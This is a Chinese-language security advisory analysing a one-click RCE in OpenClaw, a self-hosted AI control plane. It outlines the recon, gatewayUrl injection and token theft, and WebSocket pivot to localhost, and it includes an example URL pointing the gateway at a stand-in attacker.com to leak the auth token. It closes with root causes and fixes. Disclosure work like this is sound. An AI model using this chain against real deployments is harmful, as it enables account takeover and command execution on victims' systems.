---
title: OpenClaw 一键RCE漏洞浅析（CVE-2026-25253）
date: 2026-03-13
category: 安全研究
tags: [漏洞情报, 安全研究, AI安全, RCE]
source: 微信安全文章
integratedFrom: [黑掉你龙虾（OpenClaw）的竟然是另一个AI？一键RCE漏洞浅析.md]
---

# OpenClaw 一键RCE漏洞浅析（CVE-2026-25253）

## 背景

OpenClaw（开源自托管 AI 控制平面）允许用户通过 Telegram、微信等多种消息应用统一接入，具备**完整系统访问权限**，成为极具吸引力的攻击目标。

## 漏洞概述

| 项目 | 详情 |
|------|------|
| CVE编号 | CVE-2026-25253 |
| 发现时间 | 2026年1月26日 |
| 发现耗时 | 1小时40分钟（Hackian自动渗透） |
| 利用难度 | 1-Click（一次点击） |
| 修复时间 | 上报后不足3天 |

## 完整利用链

### 第一阶段：侦察（Recon）

1. **扫描端点**：全面扫描 HTTP/WS 暴露面，建立攻击面地图
2. **Source Map 泄露**：生产环境意外暴露 `.map` 文件，攻击者可完整还原前端源码
3. **WebSocket Origin 验证缺失**：任意域名均可发起 WebSocket 升级请求
4. **关键函数定位**：定位 `buildToolStreamMessage` 函数（向 AI 助手下达指令的核心函数）

### 第二阶段：URL参数注入 + Token泄露

**漏洞本质**：`gatewayUrl` 参数可被外部任意覆盖，无任何鉴权保护。

```
攻击者构造含恶意 gatewayUrl 的链接
↓ 受害者访问攻击者页面，触发重定向到：
   https://victim-openclaw.com?gatewayUrl=wss://attacker.com
↓ OpenClaw 前端自动连接攻击者的 WebSocket 服务器
↓ LocalStorage 中存储的 Auth Token 即刻外泄
↓ 攻击者获得合法 Token → 完成账户接管（ATO）
```

### 第三阶段：本地部署也不安全（最危险）

即便 OpenClaw 仅部署在 localhost，三个技术事实叠加使本地部署也无法幸免：

1. **WebSocket 没有 CORS 等效的跨域限制机制**
2. **OpenClaw 网关未验证 Origin Header**
3. **Chrome 144 默认未启用「本地网络访问」权限提示**

完整 RCE 流程：
```
1. 攻击者搭建恶意 WebSocket 服务器，监听并保存 Token
2. 受害者浏览器访问恶意页面 → 重定向至含恶意 gatewayUrl 的控制台
3. 攻击者服务器接收并存储 Gateway Auth Token
4. 攻击者借助浏览器作为跳板，用 Token 建立合法 WS 会话连接 localhost 网关
5. AI 助手执行攻击者指令 → 系统命令运行 → 结果回传
```

## 漏洞根因分析

| 问题 | 根因 |
|------|------|
| URL参数覆盖 | `gatewayUrl` 参数无鉴权保护 |
| WebSocket跨域 | 服务端未实施严格 Origin 验证 |
| Source Map泄露 | 生产环境禁止暴露 `.map` 文件 |

## 修复措施（commit 8cb0fa9）

受影响版本：**≤ 2026.1.29**

1. **移除或严格限制 `gatewayUrl` 参数的覆盖能力**
2. **服务端实施严格 Origin 验证**
3. **生产环境禁止暴露 `.map` 文件**

## 深层启示

- **AI 助手的「全系统访问权限」是双刃剑**：攻击者得到的不是受限 Shell，而是拥有完整操作权限的自动化代理
- **自托管工具的安全门槛远超普通用户认知**：公网暴露需专业安全加固
- **WebSocket 是新兴、缺乏规范的攻击面**：开发者普遍缺乏成熟防护框架
- **AI 可以自动化攻击另一个 AI 系统**：Hackian 在无人干预下，100分钟内完成从侦察到漏洞确认的全流程

## 参考资料

- [Ethiack 原始报告](https://ethiack.com/news/blog/one-click-rce-openclaw)
- [CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
- [修复 Commit 8cb0fa9](https://github.com/openclaw/openclaw/commit/8cb0fa9)
